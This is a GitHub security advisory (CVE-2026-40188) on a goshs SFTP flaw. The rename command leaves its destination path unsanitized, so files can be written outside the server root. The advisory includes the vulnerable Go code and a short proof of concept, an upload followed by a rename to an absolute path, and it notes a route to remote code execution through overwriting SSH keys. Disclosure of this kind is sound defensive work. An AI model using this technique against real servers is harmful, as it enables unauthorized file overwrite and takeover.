# [H] goshs is Missing Write Protection for Parametric Data Values

## Summary
Severity: High
Advisory: GHSA-2943-crp8-38xx
CVE: CVE-2026-40188
CWE: CWE-1314
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:N/I:H/A:N (CVSS_V3)
Published: 2026-04-10
Source: https://github.com/advisories/GHSA-2943-crp8-38xx
Type: github-advisory

## Affected
- Go: `github.com/patrickhener/goshs` — affected >=1.0.7

## Details
### Summary
The SFTP command rename sanitizes only the source path and not the destination, so it is possible to write outside of the root directory of the SFTP. 

### Details

Here is the issue:
```go
// helper.go:155-215
func cmdFile(root string, r *sftp.Request, ip string, sftpServer *SFTPServer) error {
    fullPath, err := sanitizePath(r.Filepath, root)  // Source: SANITIZED
    if err != nil {
        return err
    }
    switch r.Method {
    // ...
    case "Rename":
        err := os.Rename(fullPath, r.Target)  // Destination: NOT SANITIZED!
```


### PoC

To exploit just upload a file on the SFTP and rename it to a file with full path. 

Currently no key.txt file inside /tmp

``` bash
$ ls key.txt
ls: key.txt: No such file or directory
```


Start the SFTP server:
``` bash
/tmp/sftp-server $ goshs -sftp -b 'user:user' -d .
WARNING[2026-04-02 20:00:18] upload-folder mode deactivated due to use of 'sftp' mode
WARNING[2026-04-02 20:00:18] There is a newer Version (v2.0.0-beta.3) of goshs available. Run --update to update goshs.
INFO   [2026-04-02 20:00:18] Starting SFTP server on port 0.0.0.0:2022
WARNING[2026-04-02 20:00:18] You are using basic auth without SSL. Your credentials will be transferred in cleartext. Consider using -s, too.
INFO   [2026-04-02 20:00:18] Using basic auth with user 'user' and password 'user'
INFO   [2026-04-02 20:00:18] Download embedded file at: /example.txt?embedded
INFO   [2026-04-02 20:00:18] Serving on interface lo0 bound to 127.0.0.1:8000
INFO   [2026-04-02 20:00:18] Serving on interface en0 bound to 192.168.68.51:8000
INFO   [2026-04-02 20:00:18] Serving HTTP from /tmp/sftp-server
```

Connect to the SFTP and uploading the file:
``` bash
$ sftp -P 2022 user@localhost
user@localhost's password:
Connected to localhost.
sftp> put /Users/user/Downloads/key.txt
Uploading /Users/user/Downloads/key.txt to /tmp/sftp-server/key.txt
key.txt                                                                                                                                                   100%   15    40.9KB/s   00:00
```

The file is stored properly. 

goshs log:
```
INFO   [2026-04-02 20:03:31] SFTP: [::1]:61742 - [Put] - "/tmp/sftp-server/key.txt"
```

Rename command with full path:
``` bash
sftp> rename key.txt /tmp/key.txt
```

goshs log:
```
INFO   [2026-04-02 20:04:09] SFTP: [::1]:61742 - [Rename] - "/tmp/sftp-server/key.txt to /tmp/key.txt"
```

Key file is now in /tmp
```
$ ls key.txt
key.txt
```


### Impact
This allows file write and can be used either for an RCE in form of overwrite an SSH key, or by overwriting a configuration etc.

## References
- https://github.com/patrickhener/goshs/security/advisories/GHSA-2943-crp8-38xx
- https://nvd.nist.gov/vuln/detail/CVE-2026-40188
- https://github.com/patrickhener/goshs/commit/141c188ce270ffbec087844a50e5e695b7da7744
- https://github.com/patrickhener/goshs
- https://github.com/patrickhener/goshs/releases/tag/v2.0.0-beta.4
